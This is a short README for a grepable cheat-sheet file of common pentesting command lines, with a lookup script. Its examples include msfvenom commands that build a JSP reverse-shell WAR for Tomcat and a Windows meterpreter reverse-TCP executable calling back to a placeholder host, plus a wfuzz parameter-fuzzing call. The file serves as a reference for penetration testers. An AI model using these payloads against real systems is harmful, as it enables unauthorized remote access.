# Pentesting CLI Call Collection # 

A single grepable file, that contains lots of prototype like CLI calls, of the most common pentesting tools.
Spend less time with man pages ;)

## Example
You can grep the call collection via the `qccc` script. For example:
```bash
qccc msfvenom
# Found 6 results:
# msfvenom generate java tcp reverse shell with file format war for tomcat deployment
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war
# msfvenom generate meterpreter with file format exe for windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe
# msfvenom list available payloads
msfvenom -l payloads
```

Or grep the call collection manually:
```bash
grep -i wfuzz cli-call-collection.txt          
# wfuzz fuzz a get parameter with; -f out file; --hw hide response with word count; --hh hide response with character count; --hc <code> hide response code <code>
wfuzz --hw <word-count> -f <out-file> -w <wordlist> 'https://target.url?param1=FUZZ&param2=42'
```
